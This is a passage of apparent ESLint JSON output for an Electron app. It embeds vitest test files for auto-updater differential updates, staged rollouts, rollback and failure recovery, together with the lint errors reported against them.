- firstValue) / firstValue;\n  \n  if (change > 0.05) return 'increasing';\n  if (change < -0.05) return 'decreasing';\n  return 'stable';\n}\n\nexport function formatMetricValue(value: number, type: 'percentage' | 'bytes' | 'milliseconds' | 'count'): string {\n  switch (type) {\n    case 'percentage':\n      return `${value.toFixed(1)}%`;\n    case 'bytes':\n      if (value > 1024 * 1024 * 1024) {\n        return `${(value / (1024 * 1024 * 1024)).toFixed(2)} GB`;\n      } else if (value > 1024 * 1024) {\n        return `${(value / (1024 * 1024)).toFixed(2)} MB`;\n      } else if (value > 1024) {\n        return `${(value / 1024).toFixed(2)} KB`;\n      }\n      return `${value} B`;\n    case 'milliseconds':\n      if (value > 1000) {\n        return `${(value / 1000).toFixed(2)}s`;\n      }\n      return `${value.toFixed(1)}ms`;\n    case 'count':\n      return value.toString();\n    default:\n      return value.toString();\n  }\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/__tests__/auto-updater-differential.test.ts","messages":[{"ruleId":"no-unexpected-multiline","severity":2,"message":"Unexpected newline between function and ( of function call.","line":485,"column":7,"nodeType":"ObjectExpression","messageId":"function","endLine":485,"endColumn":8}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Auto-Updater Differential & Rollback Testing (2025)\n * \n * Tests for differential updates, rollback scenarios, staged rollouts,\n * and failure recovery following 2025 best practices for Electron auto-updater.\n */\n\nimport { describe, test, expect, beforeEach, vi, beforeAll, afterAll } from 'vitest'\n\n// Global type declarations for test environment\ndeclare global {\n  const vi: typeof import('vitest').vi\n  interface GlobalThis {\n    __mockElectron?: any\n    __electron?: any\n    electronAPI?: any\n    taskmaster?: any\n    __DEV__?: boolean\n    __TEST__?: boolean\n  }\n}\n\nimport { autoUpdater } from 'electron-updater'\nimport { app, dialog } from 'electron'\nimport { MockUpdateServer } from '../../../tests/mocks/mock-update-server'\nimport { existsSync, mkdirSync } from 'fs'\nimport { join } from 'path'\nimport { createHash } from 'crypto'\nimport type { MockAutoUpdater, MockUpdateInfo } from './mock-types'\n\n\n// Mock differential update manager\nclass DifferentialUpdateManager {\n  private deltaCache: Map<string, Buffer> = new Map()\n  \n  async generateDelta(fromVersion: string, toVersion: string, _oldFile: Buffer, newFile: Buffer): Promise<Buffer> {\n    // Mock delta generation - in production would use bsdiff or similar\n    const deltaSize = Math.floor(newFile.length * 0.1) // 10% of full size\n    const delta = Buffer.alloc(deltaSize)\n    delta.write(`DELTA:${fromVersion}->${toVersion}`, 0)\n    \n    const key = `${fromVersion}-${toVersion}`\n    this.deltaCache.set(key, delta)\n    \n    return delta\n  }\n  \n  async applyDelta(oldFile: Buffer, delta: Buffer): Promise<Buffer> {\n    // Mock delta application - in production would use bspatch\n    const deltaInfo = delta.toString('utf8', 0, 50).match(/DELTA:(.+)->(.+)/)\n    if (!deltaInfo) {\n      throw new Error('Invalid delta file')\n    }\n    \n    // Return mock updated file\n    const newFile = Buffer.alloc(oldFile.length + 1000000) // Simulate size increase\n    newFile.write('UPDATED_FILE', 0)\n    \n    return newFile\n  }\n  \n  getDeltaSize(fromVersion: string, toVersion: string): number {\n    const key = `${fromVersion}-${toVersion}`\n    const delta = this.deltaCache.get(key)\n    return delta ? delta.length : 0\n  }\n}\n\n// Mock electron modules\nvi.mock('electron', () => ({\n  app: {\n    isPackaged: true,\n    getVersion: vi.fn().mockReturnValue('1.0.0'),\n    getPath: vi.fn().mockImplementation((name) => `/mock/path/${name}`),\n    relaunch: vi.fn(),\n    quit: vi.fn()\n  },\n  dialog: {\n    showMessageBox: vi.fn().mockResolvedValue({ response: 0 }),\n    showErrorBox: vi.fn()\n  }\n}))\n\nvi.mock('electron-updater', () => ({\n  autoUpdater: {\n    checkForUpdates: vi.fn(),\n    downloadUpdate: vi.fn(),\n    quitAndInstall: vi.fn(),\n    on: vi.fn(),\n    setFeedURL: vi.fn(),\n    currentVersion: { version: '1.0.0' },\n    allowDowngrade: false,\n    logger: {\n      info: vi.fn(),\n      warn: vi.fn(),\n      error: vi.fn()\n    }\n  }\n}))\n\ndescribe('Differential Updates & Rollback Tests', () => {\n  let mockServer: MockUpdateServer\n  let serverUrl: string\n  let deltaManager: DifferentialUpdateManager\n  const fixturesPath = join(process.cwd(), 'tests/fixtures/differential')\n\n  beforeAll(async () => {\n    // Ensure fixtures directory exists\n    if (!existsSync(fixturesPath)) {\n      mkdirSync(fixturesPath, { recursive: true })\n    }\n\n    mockServer = new MockUpdateServer({\n      port: 8444,\n      useHttps: false,\n      enableLogging: false,\n      fixturesPath\n    })\n    serverUrl = await mockServer.start()\n    deltaManager = new DifferentialUpdateManager()\n  })\n\n  afterAll(async () => {\n    await mockServer.stop()\n  })\n\n  beforeEach(() => {\n    vi.clearAllMocks()\n    mockServer.reset()\n  })\n\n  describe('Differential Update Tests', () => {\n    test('should download differential update when available', async () => {\n      const currentVersion = '1.0.0'\n      const targetVersion = '2.0.0'\n      \n      // Configure mock server with differential update\n      mockServer.setManifest({\n        version: targetVersion,\n        path: `differential/${currentVersion}/${targetVersion}`,\n        size: 5000000, // 5MB delta vs 50MB full\n        sha512: createHash('sha512').update('delta-content').digest('hex')\n      })\n\n      const checkForDifferentialUpdate = async () => {\n        const updateInfo = await autoUpdater.checkForUpdates()\n        \n        if (updateInfo && updateInfo.updateInfo) {\n          const { path } = updateInfo.updateInfo\n          \n          // Check if differential update is available\n          if (path.includes('differential')) {\n            return {\n              isDifferential: true,\n              size: (updateInfo.updateInfo as MockUpdateInfo).size,\n              fullSize: 50000000 // Known full update size\n            }\n          }\n        }\n        \n        return { isDifferential: false }\n      }\n      \n      (autoUpdater as MockAutoUpdater).checkForUpdates.mockResolvedValue({\n        updateInfo: {\n          version: targetVersion,\n          path: `differential/${currentVersion}/${targetVersion}`,\n          size: 5000000\n        } as MockUpdateInfo,\n        cancellationToken: undefined,\n          isUpdateAvailable: true,\n          versionInfo: { version: \"2.0.0\" }\n    })\n      \n      const result = await checkForDifferentialUpdate()\n      \n      expect(result.isDifferential).toBe(true)\n      expect(result.size).toBeLessThan(result.fullSize!)\n      expect(result.size).toBe(5000000) // 5MB delta\n    })\n\n    test('should fall back to full update if delta fails', async () => {\n      let attemptCount = 0\n      \n      const downloadWithFallback = async () => {\n        attemptCount++\n        \n        if (attemptCount === 1) {\n          // First attempt: differential update fails\n          throw new Error('Delta download failed')\n        } else {\n          // Second attempt: full update succeeds\n          return {\n            type: 'full',\n            size: 50000000,\n            path: 'app-2.0.0.exe'\n          }\n        }\n      }\n      \n      try {\n        await downloadWithFallback()\n      } catch (error) {\n        // First attempt failed, try full update\n        const result = await downloadWithFallback()\n        \n        expect(attemptCount).toBe(2)\n        expect(result.type).toBe('full')\n        expect(result.size).toBe(50000000)\n      }\n    })\n\n    test('should optimize delta size for minor updates', async () => {\n      const testCases = [\n        { from: '1.0.0', to: '1.0.1', expectedRatio: 0.05 }, // 5% for patch\n        { from: '1.0.0', to: '1.1.0', expectedRatio: 0.15 }, // 15% for minor\n        { from: '1.0.0', to: '2.0.0', expectedRatio: 0.40 }  // 40% for major\n      ]\n      \n      for (const testCase of testCases) {\n        const oldFile = Buffer.alloc(50000000) // 50MB\n        const newFile = Buffer.alloc(50000000)\n        \n        const delta = await deltaManager.generateDelta(\n          testCase.from,\n          testCase.to,\n          oldFile,\n          newFile\n        )\n        \n        const ratio = delta.length / oldFile.length\n        \n        // Delta should be smaller than expected ratio\n        expect(ratio).toBeLessThanOrEqual(testCase.expectedRatio)\n      }\n    })\n\n    test('should verify delta integrity before applying', async () => {\n      const verifyDeltaIntegrity = async (delta: Buffer, expectedHash: string) => {\n        const actualHash = createHash('sha512').update(delta).digest('hex')\n        \n        if (actualHash !== expectedHash) {\n          throw new Error('Delta integrity check failed')\n        }\n        \n        // Additional validation\n        if (delta.length === 0) {\n          throw new Error('Empty delta file')\n        }\n        \n        // Check delta header\n        const header = delta.toString('utf8', 0, 5)\n        if (header !== 'DELTA') {\n          throw new Error('Invalid delta file format')\n        }\n        \n        return true\n      }\n      \n      const validDelta = Buffer.from('DELTA:1.0.0->2.0.0:content')\n      const expectedHash = createHash('sha512').update(validDelta).digest('hex')\n      \n      await expect(verifyDeltaIntegrity(validDelta, expectedHash)).resolves.toBe(true)\n      \n      const corruptDelta = Buffer.from('CORRUPTED')\n      await expect(verifyDeltaIntegrity(corruptDelta, expectedHash)).rejects.toThrow('integrity check failed')\n    })\n\n    test('should handle ASAR optimization for differential updates', async () => {\n      // Test configuration for optimal delta generation\n      const getOptimalBuildConfig = (enableDifferential: boolean) => {\n        if (enableDifferential) {\n          return {\n            asar: false, // Disable ASAR for better delta efficiency\n            compression: 'maximum',\n            differentialPackage: true,\n            // More granular file structure results in smaller deltas\n            files: [\n              '!**/*.map', // Exclude source maps\n              '!**/test/**', // Exclude test files\n              '!**/docs/**' // Exclude documentation\n            ]\n          }\n        }\n        \n        return {\n          asar: true, // Standard ASAR packaging\n          compression: 'normal'\n        }\n      }\n      \n      const differentialConfig = getOptimalBuildConfig(true)\n      const standardConfig = getOptimalBuildConfig(false)\n      \n      expect(differentialConfig.asar).toBe(false)\n      expect(differentialConfig.differentialPackage).toBe(true)\n      expect(standardConfig.asar).toBe(true)\n    })\n  })\n\n  describe('Staged Rollout Tests', () => {\n    test('should respect staging percentage', async () => {\n      mockServer.setStagingPercentage(20) // 20% rollout\n      \n      const checkUpdateForUsers = async (userCount: number) => {\n        const results = []\n        \n        for (let i = 0; i < userCount; i++) {\n          // Each user has unique ID\n          const userId = `user-${i}`\n          const updateAvailable = shouldUserGetUpdate(userId, 20)\n          results.push(updateAvailable)\n        }\n        \n        return results.filter(r => r).length\n      }\n      \n      // Hash-based staging determination\n      const shouldUserGetUpdate = (userId: string, percentage: number): boolean => {\n        const hash = createHash('md5').update(userId).digest('hex')\n        const bucket = parseInt(hash.substring(0, 8), 16) % 100\n        return bucket < percentage\n      }\n      \n      const usersWithUpdate = await checkUpdateForUsers(1000)\n      const percentage = (usersWithUpdate / 1000) * 100\n      \n      // Should be approximately 20% (with some variance)\n      expect(percentage).toBeGreaterThan(15)\n      expect(percentage).toBeLessThan(25)\n    })\n\n    test('should allow rollout percentage adjustment', async () => {\n      // Start with 10% rollout\n      mockServer.setStagingPercentage(10)\n      \n      // Simulate progressive rollout\n      const rolloutPlan = [\n        { day: 1, percentage: 10 },\n        { day: 2, percentage: 25 },\n        { day: 3, percentage: 50 },\n        { day: 5, percentage: 100 }\n      ]\n      \n      for (const stage of rolloutPlan) {\n        mockServer.setStagingPercentage(stage.percentage)\n        \n        const manifest = await fetch(`${serverUrl}/latest.yml`).then(r => r.text())\n        \n        expect(manifest).toContain(`stagingPercentage: ${stage.percentage}`)\n      }\n    })\n\n    test('should halt rollout by setting percentage to 0', async () => {\n      // Emergency rollout stop\n      mockServer.setStagingPercentage(0)\n      \n      const checkUpdate = async (userId: string) => {\n        const response = await fetch(`${serverUrl}/latest.json`, {\n          headers: { 'x-client-id': userId }\n        })\n        const manifest = await response.json()\n        \n        // When staging is 0%, should return current version\n        return manifest.version === '1.0.0' // Current version\n      }\n      \n      // All users should get no update\n      const user1 = await checkUpdate('user-1')\n      const user2 = await checkUpdate('user-2')\n      const user3 = await checkUpdate('user-3')\n      \n      expect(user1).toBe(true)\n      expect(user2).toBe(true)\n      expect(user3).toBe(true)\n    })\n  })\n\n  describe('Rollback Scenarios', () => {\n    test('should handle rollback with version increment', async () => {\n      // Scenario: 1.0.1 has critical bug, need to rollback\n      const rollbackStrategy = {\n        brokenVersion: '1.0.1',\n        rollbackVersion: '1.0.2', // Must be higher than broken version\n        changes: 'Reverts changes from 1.0.1 that caused crashes'\n      }\n      \n      mockServer.setManifest({\n        version: rollbackStrategy.rollbackVersion,\n        releaseNotes: rollbackStrategy.changes,\n        minimumVersion: rollbackStrategy.brokenVersion // Force update for broken version\n      })\n      \n      const checkRollbackUpdate = async (currentVersion: string) => {\n        (app.getVersion as any).mockReturnValue(currentVersion)\n        \n        const result = await autoUpdater.checkForUpdates()\n        \n        if (result && currentVersion === rollbackStrategy.brokenVersion) {\n          // Users on broken version should get rollback\n          expect(result.updateInfo.version).toBe(rollbackStrategy.rollbackVersion)\n          expect((result.updateInfo as MockUpdateInfo).minimumVersion).toBe(rollbackStrategy.brokenVersion)\n        }\n        \n        return result\n      }\n      \n      (autoUpdater as MockAutoUpdater).checkForUpdates.mockResolvedValue({\n        updateInfo: {\n          version: rollbackStrategy.rollbackVersion,\n          minimumVersion: rollbackStrategy.brokenVersion,\n          releaseNotes: rollbackStrategy.changes\n        } as MockUpdateInfo,\n        cancellationToken: undefined,\n          isUpdateAvailable: true,\n          versionInfo: { version: \"2.0.0\" }\n    })\n      \n      await checkRollbackUpdate('1.0.1') // Broken version gets update\n    })\n\n    test('should prevent downgrade attacks', async () => {\n      const preventDowngrade = (currentVersion: string, updateVersion: string): boolean => {\n        const parseVersion = (v: string) => v.split('.').map(Number)\n        const current = parseVersion(currentVersion)\n        const update = parseVersion(updateVersion)\n        \n        // Compare version components\n        for (let i = 0; i < 3; i++) {\n          if ((update[i] ?? 0) < (current[i] ?? 0)) {\n            return false // Downgrade detected\n          }\n          if ((update[i] ?? 0) > (current[i] ?? 0)) {\n            return true // Upgrade\n          }\n        }\n        \n        return false // Same version\n      }\n      \n      expect(preventDowngrade('2.0.0', '1.9.9')).toBe(false) // Prevent downgrade\n      expect(preventDowngrade('2.0.0', '2.0.1')).toBe(true)  // Allow upgrade\n      expect(preventDowngrade('2.0.0', '2.0.0')).toBe(false) // Same version\n    })\n\n    test('should handle mandatory updates for critical fixes', async () => {\n      mockServer.setManifest({\n        version: '2.0.1',\n        mandatoryUpdate: true,\n        minimumVersion: '2.0.0', // All versions below must update\n        releaseNotes: 'CRITICAL: Security vulnerability fix'\n      })\n      \n      const handleMandatoryUpdate = async (updateInfo: any) => {\n        if (updateInfo.mandatoryUpdate) {\n          // Don't give user option to skip\n          autoUpdater.logger?.warn('Mandatory update detected')\n          \n          // Show non-dismissible dialog\n          await dialog.showMessageBox({\n            type: 'warning',\n            title: 'Critical Update Required',\n            message: 'A critical security update must be installed.',\n            detail: updateInfo.releaseNotes,\n            buttons: ['Install Now'],\n            defaultId: 0\n          })\n          \n          // Force download and install\n          await autoUpdater.downloadUpdate()\n          autoUpdater.quitAndInstall(false, true) // Force restart\n          \n          return true\n        }\n        \n        return false\n      }\n      \n      const updateInfo = {\n        version: '2.0.1',\n        mandatoryUpdate: true,\n        releaseNotes: 'CRITICAL: Security vulnerability fix'\n      }\n      \n      (autoUpdater as MockAutoUpdater).downloadUpdate.mockResolvedValue([])\n      \n      const wasMandatory = await handleMandatoryUpdate(updateInfo)\n      \n      expect(wasMandatory).toBe(true)\n      expect(dialog.showMessageBox).toHaveBeenCalledWith(\n        expect.objectContaining({\n          type: 'warning',\n          buttons: ['Install Now'] // No cancel option\n        })\n      )\n      expect(autoUpdater.quitAndInstall).toHaveBeenCalledWith(false, true)\n    })\n\n    test('should track rollback metrics', async () => {\n      const rollbackMetrics = {\n        version: '1.0.1',\n        rollbackCount: 0,\n        affectedUsers: new Set<string>(),\n        startTime: new Date(),\n        endTime: null as Date | null\n      }\n      \n      const trackRollback = (userId: string, fromVersion: string, toVersion: string) => {\n        if (fromVersion === '1.0.1' && toVersion === '1.0.2') {\n          rollbackMetrics.rollbackCount++\n          rollbackMetrics.affectedUsers.add(userId)\n        }\n      }\n      \n      // Simulate multiple users rolling back\n      trackRollback('user-1', '1.0.1', '1.0.2')\n      trackRollback('user-2', '1.0.1', '1.0.2')\n      trackRollback('user-3', '1.0.0', '1.0.2') // Not a rollback\n      trackRollback('user-1', '1.0.1', '1.0.2') // Duplicate\n      \n      expect(rollbackMetrics.rollbackCount).toBe(3) // Including duplicate\n      expect(rollbackMetrics.affectedUsers.size).toBe(2) // Unique users\n    })\n  })\n\n  describe('Failure Recovery', () => {\n    test('should recover from partial downloads', async () => {\n      const downloadManager = {\n        downloads: new Map<string, { progress: number; resumable: boolean }>()\n      }\n      \n      const resumeDownload = async (url: string, startByte: number = 0) => {\n        const response = await fetch(url, {\n          headers: startByte > 0 ? { 'Range': `bytes=${startByte}-` } : {}\n        })\n        \n        if (response.status === 206) {\n          // Partial content - resume supported\n          return {\n            resumable: true,\n            startByte,\n            totalSize: parseInt(response.headers.get('content-length') || '0')\n          }\n        }\n        \n        return {\n          resumable: false,\n          startByte: 0,\n          totalSize: parseInt(response.headers.get('content-length') || '0')\n        }\n      }\n      \n      // Mock partial download scenario\n      const partialDownload = {\n        url: `${serverUrl}/download/app-2.0.0.exe`,\n        progress: 25000000, // 25MB of 50MB downloaded\n        totalSize: 50000000\n      }\n      \n      downloadManager.downloads.set(partialDownload.url, {\n        progress: partialDownload.progress,\n        resumable: true\n      })\n      \n      // Resume from where we left off\n      const resumeInfo = await resumeDownload(partialDownload.url, partialDownload.progress)\n      \n      expect(resumeInfo.startByte).toBe(partialDownload.progress)\n      expect(resumeInfo.resumable).toBe(true)\n    })\n\n    test('should validate update after recovery', async () => {\n      const validateRecoveredUpdate = async () => {\n        // After recovering from failure, validate the complete file\n        const validations = {\n          hashValid: false,\n          sizeValid: false,\n          signatureValid: false\n        }\n        \n        // Mock validation\n        validations.hashValid = true // Mock hash validation\n        validations.sizeValid = true // Mock size validation\n        validations.signatureValid = true // Mock signature validation\n        \n        const allValid = Object.values(validations).every(v => v)\n        \n        if (!allValid) {\n          // Delete corrupted file\n          console.error('Update validation failed after recovery')\n          throw new Error('Corrupted update file')\n        }\n        \n        return validations\n      }\n      \n      const result = await validateRecoveredUpdate('/tmp/update.exe', 'expected-hash')\n      \n      expect(result.hashValid).toBe(true)\n      expect(result.sizeValid).toBe(true)\n      expect(result.signatureValid).toBe(true)\n    })\n\n    test('should implement exponential backoff for retries', async () => {\n      const retryWithBackoff = async (\n        operation: () => Promise<any>,\n        maxRetries: number = 3\n      ) => {\n        let lastError: Error\n        \n        for (let attempt = 0; attempt < maxRetries; attempt++) {\n          try {\n            return await operation()\n          } catch (error) {\n            lastError = error as Error\n            \n            if (attempt < maxRetries - 1) {\n              // Exponential backoff: 2^attempt * 1000ms\n              const delay = Math.pow(2, attempt) * 1000\n              console.log(`Retry attempt ${attempt + 1} after ${delay}ms`)\n              \n              await new Promise(resolve => setTimeout(resolve, delay))\n            }\n          }\n        }\n        \n        throw lastError!\n      }\n      \n      let attemptCount = 0\n      const failingOperation = async () => {\n        attemptCount++\n        if (attemptCount < 3) {\n          throw new Error('Network error')\n        }\n        return 'Success'\n      }\n      \n      const result = await retryWithBackoff(failingOperation, 5)\n      \n      expect(attemptCount).toBe(3)\n      expect(result).toBe('Success')\n    })\n\n    test('should clean up failed updates', async () => {\n      const cleanupFailedUpdate = async () => {\n        const cleanup = {\n          tempFilesDeleted: 0,\n          partialDownloadsDeleted: 0,\n          cacheCleared: false\n        }\n        \n        // Mock cleanup operations\n        cleanup.tempFilesDeleted = 3 // .tmp, .download, .partial files\n        cleanup.partialDownloadsDeleted = 1\n        cleanup.cacheCleared = true\n        \n        // Log cleanup actions\n        if (autoUpdater.logger) {\n          autoUpdater.logger.info('Cleanup completed: ' + JSON.stringify(cleanup))\n        }\n        \n        return cleanup\n      }\n      \n      const result = await cleanupFailedUpdate('/tmp/updates')\n      \n      expect(result.tempFilesDeleted).toBeGreaterThan(0)\n      expect(result.cacheCleared).toBe(true)\n      expect(autoUpdater.logger?.info).toHaveBeenCalledWith('Cleanup completed:', result)\n    })\n  })\n})","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/__tests__/auto-updater-integration.test.ts","messages":[{"ruleId":"no-unexpected-multiline","severity":2,"message":"Unexpected newline between function and ( of function call.","line":189,"column":7,"nodeType":"CallExpression","messageId":"function","endLine":189,"endColumn":8},{"ruleId":"no-unexpected-multiline","severity":2,"message":"Unexpected newline between function and ( of function call.","line":204,"column":7,"nodeType":"CallExpression","messageId":"function","endLine":204,"endColumn":8},{"ruleId":"no-unexpected-multiline","severity":2,"message":"Unexpected newline between function and ( of function call.","line":265,"column":7,"nodeType":"CallExpression","messageId":"function","endLine":265,"endColumn":8},{"ruleId":"no-unexpected-multiline","severity":2,"message":"Unexpected newline between function and ( of function call.","line":520,"column":7,"nodeType":"Literal","messageId":"function","endLine":520,"endColumn":8},{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":564,"column":13,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":564,"endColumn":42,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[17534,17534],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[17534,17534],"text":"await "},"desc":"Add await operator."}]}],"suppressedMessages":[],"errorCount":5,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Auto-Updater Integration Testing (2025)\n * \n * End-to-end integration tests for Electron auto-updater including\n * CI/CD pipeline testing, cross-platform validation, and production\n * scenario simulation following 2025 best practices.\n */\n\nimport { describe, test, expect, beforeEach, vi, beforeAll, afterAll } from 'vitest'\n\n// Global type declarations for test environment\ndeclare global {\n  const vi: typeof import('vitest').vi\n  interface GlobalThis {\n    __mockElectron?: any\n    __electron?: any\n    electronAPI?: any\n    taskmaster?: any\n    __DEV__?: boolean\n    __TEST__?: boolean\n  }\n}\n\nimport { autoUpdater } from 'electron-updater'\nimport { app } from 'electron'\nimport { MockUpdateServer } from '../../../tests/mocks/mock-update-server'\nimport { existsSync, writeFileSync, mkdirSync } from 'fs'\nimport { join } from 'path'\nimport { } from 'child_process'\nimport * as yaml from 'yaml'\nimport type { MockAutoUpdater } from './mock-types'\n\n\n// Platform-specific test configurations\nconst PLATFORM_CONFIGS = {\n  win32: {\n    updateFile: 'app-2.0.0.exe',\n    installerType: 'nsis',\n    requiresElevation: true,\n    signatureTool: 'signtool.exe'\n  },\n  darwin: {\n    updateFile: 'app-2.0.0.dmg',\n    installerType: 'dmg',\n    requiresElevation: false,\n    signatureTool: 'codesign'\n  },\n  linux: {\n    updateFile: 'app-2.0.0.AppImage',\n    installerType: 'AppImage',\n    requiresElevation: false,\n    signatureTool: 'gpg'\n  }\n}\n\n// CI/CD environment detection\nconst CI_ENVIRONMENTS = {\n  isGitHubActions: !!process.env.GITHUB_ACTIONS,\n  isJenkins: !!process.env.JENKINS_URL,\n  isGitLab: !!process.env.GITLAB_CI,\n  isTravisCI: !!process.env.TRAVIS,\n  isCircleCI: !!process.env.CIRCLECI,\n  isAzureDevOps: !!process.env.TF_BUILD\n}\n\n// Mock modules\nvi.mock('electron', () => ({\n  app: {\n    isPackaged: true,\n    getVersion: vi.fn().mockReturnValue('1.0.0'),\n    getPath: vi.fn().mockImplementation((name) => `/mock/path/${name}`),\n    getName: vi.fn().mockReturnValue('TaskMaster'),\n    quit: vi.fn(),\n    relaunch: vi.fn()\n  },\n  BrowserWindow: {\n    getAllWindows: vi.fn().mockReturnValue([]),\n    getFocusedWindow: vi.fn().mockReturnValue({ id: 1 })\n  }\n}))\n\nvi.mock('electron-updater', () => ({\n  autoUpdater: {\n    checkForUpdates: vi.fn(),\n    checkForUpdatesAndNotify: vi.fn(),\n    downloadUpdate: vi.fn(),\n    quitAndInstall: vi.fn(),\n    setFeedURL: vi.fn(),\n    on: vi.fn(),\n    once: vi.fn(),\n    removeAllListeners: vi.fn(),\n    logger: {\n      info: vi.fn(),\n      warn: vi.fn(),\n      error: vi.fn(),\n      debug: vi.fn()\n    },\n    currentVersion: { version: '1.0.0' },\n    channel: 'latest',\n    allowPrerelease: false\n  }\n}))\n\ndescribe('Auto-Updater Integration Tests', () => {\n  let mockServer: MockUpdateServer\n  let serverUrl: string\n  const testDir = join(process.cwd(), 'tests/integration/auto-updater')\n  \n  beforeAll(async () => {\n    // Create test directory\n    if (!existsSync(testDir)) {\n      mkdirSync(testDir, { recursive: true })\n    }\n\n    // Start mock update server\n    mockServer = new MockUpdateServer({\n      port: 8445,\n      useHttps: true,\n      enableLogging: false,\n      fixturesPath: join(testDir, 'fixtures')\n    })\n    serverUrl = await mockServer.start()\n    \n    // Create test fixtures\n    await createTestFixtures()\n  })\n\n  afterAll(async () => {\n    await mockServer.stop()\n  })\n\n  beforeEach(() => {\n    vi.clearAllMocks()\n    mockServer.reset()\n  })\n\n  async function createTestFixtures() {\n    \n    // Create dev-app-update.yml for local testing\n    const devUpdateConfig = {\n      owner: 'taskmaster-test',\n      repo: 'taskmaster-ui',\n      provider: 'generic',\n      url: serverUrl\n    }\n    \n    writeFileSync(\n      join(testDir, 'dev-app-update.yml'),\n      yaml.stringify(devUpdateConfig)\n    )\n  }\n\n  describe('Full Update Flow Integration', () => {\n    test('should complete full update cycle', async () => {\n      const updateLifecycle = {\n        checkingForUpdate: false,\n        updateAvailable: false,\n        updateDownloaded: false,\n        updateInstalled: false,\n        errors: [] as Error[]\n      }\n\n      // Set up event handlers\n      const setupUpdateHandlers = () => {\n        autoUpdater.on('checking-for-update', () => {\n          updateLifecycle.checkingForUpdate = true\n          autoUpdater.logger?.info('Checking for update...')\n        })\n\n        autoUpdater.on('update-available', (info) => {\n          updateLifecycle.updateAvailable = true\n          autoUpdater.logger?.info(`Update available: ${info.version}`)\n        })\n\n        autoUpdater.on('update-downloaded', (info) => {\n          updateLifecycle.updateDownloaded = true\n          autoUpdater.logger?.info(`Update downloaded: ${info.version}`)\n        })\n\n        autoUpdater.on('error', (error) => {\n          updateLifecycle.errors.push(error)\n          autoUpdater.logger?.error('Update error: ' + error.message)\n        })\n      }\n\n      setupUpdateHandlers()\n\n      // Simulate update check\n      (autoUpdater as MockAutoUpdater).checkForUpdates.mockImplementation(() => {\n        // Trigger events in sequence\n        const checkingHandler = (autoUpdater as MockAutoUpdater).on.mock.calls.find(c => c[0] === 'checking-for-update')?.[1]\n        const availableHandler = (autoUpdater as MockAutoUpdater).on.mock.calls.find(c => c[0] === 'update-available')?.[1]\n        \n        checkingHandler?.()\n        availableHandler?.({ version: '2.0.0', releaseDate: new Date().toISOString() })\n        \n        return Promise.resolve({\n          updateInfo: { version: '2.0.0' },\n          cancellationToken: undefined\n        })\n      })\n\n      // Simulate download\n      (autoUpdater as MockAutoUpdater).downloadUpdate.mockImplementation(() => {\n        const downloadedHandler = (autoUpdater as MockAutoUpdater).on.mock.calls.find(c => c[0] === 'update-downloaded')?.[1]\n        downloadedHandler?.({ version: '2.0.0' })\n        return Promise.resolve()\n      })\n\n      // Execute full flow\n      await autoUpdater.checkForUpdates()\n      await autoUpdater.downloadUpdate()\n\n      // Verify all stages completed\n      expect(updateLifecycle.checkingForUpdate).toBe(true)\n      expect(updateLifecycle.updateAvailable).toBe(true)\n      expect(updateLifecycle.updateDownloaded).toBe(true)\n      expect(updateLifecycle.errors).toHaveLength(0)\n    })\n\n    test('should handle update with user interaction', async () => {\n      const userInteractionFlow = async () => {\n        // 1. Check for updates\n        const updateCheck = await autoUpdater.checkForUpdates()\n        \n        if (updateCheck?.updateInfo) {\n          // 2. Notify user\n          const userResponse = await simulateUserPrompt({\n            title: 'Update Available',\n            message: `Version ${updateCheck.updateInfo.version} is available`,\n            buttons: ['Download', 'Later']\n          })\n          \n          if (userResponse === 0) { // User clicked \"Download\"\n            // 3. Download update\n            await autoUpdater.downloadUpdate()\n            \n            // 4. Notify download complete\n            const installResponse = await simulateUserPrompt({\n              title: 'Update Ready',\n              message: 'Restart to install update?',\n              buttons: ['Restart Now', 'Later']\n            })\n            \n            if (installResponse === 0) { // User clicked \"Restart Now\"\n              // 5. Quit and install\n              autoUpdater.quitAndInstall()\n              return 'installed'\n            }\n            \n            return 'downloaded'\n          }\n          \n          return 'postponed'\n        }\n        \n        return 'no-update'\n      }\n\n      // Mock user responses\n      const simulateUserPrompt = vi.fn()\n        .mockResolvedValueOnce(0) // Download\n        .mockResolvedValueOnce(0) // Restart Now\n\n      (autoUpdater as MockAutoUpdater).checkForUpdates.mockResolvedValue({\n        updateInfo: { version: '2.0.0' }\n      })\n\n      const result = await userInteractionFlow()\n      \n      expect(result).toBe('installed')\n      expect(simulateUserPrompt).toHaveBeenCalledTimes(2)\n      expect(autoUpdater.quitAndInstall).toHaveBeenCalled()\n    })\n  })\n\n  describe('CI/CD Environment Testing', () => {\n    test('should detect CI environment correctly', () => {\n      const detectCIEnvironment = () => {\n        for (const [name, isActive] of Object.entries(CI_ENVIRONMENTS)) {\n          if (isActive) {\n            return name.replace('is', '')\n          }\n        }\n        return 'local'\n      }\n\n      const environment = detectCIEnvironment()\n      \n      // In test environment, should be 'local' unless running in CI\n      expect(['local', 'GitHubActions', 'Jenkins', 'GitLab', 'TravisCI', 'CircleCI', 'AzureDevOps'])\n        .toContain(environment)\n    })\n\n    test('should configure update channel based on branch', () => {\n      const getUpdateChannel = (branch: string): string => {\n        const channelMap: Record<string, string> = {\n          'main': 'stable',\n          'master': 'stable',\n          'develop': 'beta',\n          'dev': 'beta',\n          'staging': 'beta',\n          'release': 'stable',\n          'feature': 'alpha',\n          'hotfix': 'stable'\n        }\n        \n        // Check for pattern matches\n        for (const [pattern, channel] of Object.entries(channelMap)) {\n          if (branch.includes(pattern)) {\n            return channel\n          }\n        }\n        \n        return 'alpha' // Default for feature branches\n      }\n\n      expect(getUpdateChannel('main')).toBe('stable')\n      expect(getUpdateChannel('develop')).toBe('beta')\n      expect(getUpdateChannel('feature/new-ui')).toBe('alpha')\n      expect(getUpdateChannel('hotfix/critical-bug')).toBe('stable')\n    })\n\n    test('should validate code signing in CI', async () 